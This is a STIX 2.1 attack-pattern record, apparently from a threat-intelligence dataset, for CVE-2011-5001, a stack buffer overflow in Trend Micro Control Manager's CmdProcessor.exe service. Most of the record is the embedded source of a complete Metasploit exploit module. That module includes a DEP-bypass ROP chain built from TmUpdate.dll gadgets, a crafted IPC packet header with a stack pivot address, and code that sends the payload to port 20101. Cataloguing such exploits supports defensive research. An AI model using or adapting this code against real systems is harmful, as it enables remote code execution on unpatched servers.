{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--94e280f4-77bf-48f9-8189-b3e3db1e1479",
    "created": "2024-08-14T16:47:26.636055Z",
    "modified": "2024-08-14T16:47:26.636058Z",
    "name": "\"TrendMicro Control Manger CmdProcessor.exe Stack Buffer Overflow\"",
    "description": " This module exploits a vulnerability in the CmdProcessor.exe component of Trend Micro Control Manger up to version 5.5.  The specific flaw exists within CmdProcessor.exe service running on TCP port 20101. The vulnerable function is the CGenericScheduler::AddTask function of cmdHandlerRedAlertController.dll. When processing a specially crafted IPC packet controlled data is copied into a 256-byte stack buffer. This can be exploited to execute remote code under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/trendmicro_cmdprocessor_addtask.rb",
            "external_id": "trendmicro_cmdprocessor_addtask.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-5001"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"TrendMicro Control Manger CmdProcessor.exe Stack Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability in the CmdProcessor.exe component of Trend\n        Micro Control Manger up to version 5.5.\n\n          The specific flaw exists within CmdProcessor.exe service running on TCP port\n        20101. The vulnerable function is the CGenericScheduler::AddTask function of\n        cmdHandlerRedAlertController.dll. When processing a specially crafted IPC packet,\n        controlled data is copied into a 256-byte stack buffer. This can be exploited\n        to execute remote code under the context of the user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Luigi Auriemma',  #Initial discovery\n          'Blue',            #Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-5001'],\n          ['OSVDB', '77585'],\n          ['ZDI', '11-345']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\",\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            # TCM 5.5 cannot be installed in Win2k3 SP0-SP1, Win2k8, or XP\n            'Windows 2003 Server SP2 (DEP Bypass)',\n            {\n              'Ret'    => 0x666b34c8, # TMNotify.dll stack pivot\n              'Offset' => 5000\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-12-07',\n      'DefaultTarget'  => 0))\n\n      register_options(\n      [\n        Opt::RPORT(20101)\n      ])\n  end\n\n  def junk\n    return rand_text(4).unpack(\"L\")[0].to_i\n  end\n\n  def exploit\n\n    #TmUpdate.dll\n    rop_chain = [\n      0x668074d4,\t# POP EDX # OR AL,0F6 # RETN\n      0x3FCD0FFC,\t# Put 00001000 into edx\n      0x667611b2,\t# ADD EDX,C0330004 # RETN 04\n      0x667c99e7,\t# POP EBP # RETN [TmUpdate.dll]\n      junk,\n      0x667c99e7,\t# skip 4 bytes [TmUpdate.dll]\n      0x667e3250,\t# POP EBX # RETN [TmUpdate.dll]\n      0xffffffff,\t# NEG EBX\n      0x6683ab64,\t# INC EBX # XOR EAX,EAX # RETN [TmUpdate.dll]\n      0x6683ab64,\t# INC EBX # XOR EAX,EAX # RETN [TmUpdate.dll]\n      0x6680a1d3,\t# POP EAX # RETN [TmUpdate.dll]\n      0xffffffc0,\t# Value to negate, will become 0x00000040\n      0x66812b53,\t# NEG EAX # RETN [TmUpdate.dll]\n      0x667f030a,\t# MOV ECX,EAX # RETN [TmUpdate.dll]\n      0x667d4c7c,\t# POP EDI # RETN [TmUpdate.dll]\n      0x667e8003,\t# RETN (ROP NOP) [TmUpdate.dll]\n      0x667d54d0,\t# POP ESI # RETN [TmUpdate.dll]\n      0x667baf06,\t# JMP [EAX] [TmUpdate.dll]\n      0x66833376,\t# POP EAX # RETN [TmUpdate.dll]\n      0x6686115c,\t# ptr to &VirtualAlloc() [IAT TmUpdate.dll]\n      0x6681ceb3,\t# PUSHAD # RETN [TmUpdate.dll]\n      0x668382c3,\t# ptr to 'call esp' [TmUpdate.dll]\n    ].pack('V*')\n    #rop chain generated by mona.py\n\n    header  = \"\\x00\\x00\"\n    header << \"\\x13\\x88\"          #size of buffer\n    header << rand_text_alpha(9)\n    header << \"\\x15\\x09\\x13\"      #opcode\n    header << \"\\x00\\x00\\x00\"\n    header << rand_text_alpha(25)\n    header << \"\\xFE\\xFF\\xFF\\xFF\"  #in instruction #MOV EDI,DWORD PTR DS:[EAX+ECX] #ECX is our buffer and needs to be readable dword\n    header << \"\\xFF\\xFF\\xFF\\xFF\"  #after sum with EAX. Pointer from EAX increments by #LEA EAX,DWORD PTR DS:[EAX+EDI+4] and then is saved\n    header << \"\\xFF\\xFF\\xF4\\xFF\"  #and used again. We can essentially walk the loop which increments EBX by 1 until we get to 14 which leads\n    header << \"\\xFF\\xFF\"          #us to our vulnerable function\n    header << rand_text_alpha(1)  #align stack again for rop\n\n    pay = rop_chain\n    pay << make_nops(374 - rop_chain.length)\n    pay << \"\\xeb\\x04\"  #Short jmp 0x04\n    pay << [target.ret].pack('V')\n    pay << payload.encoded\n\n    sploit = header\n    sploit << pay\n\n    filler = rand_text_alpha(target['Offset'] - (sploit.length))\n\n    connect\n    print_status(\"Sending request...\")\n    sock.put(sploit + filler)\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-12-07",
    "x_mitre_platforms": [
        "win'"
    ]
}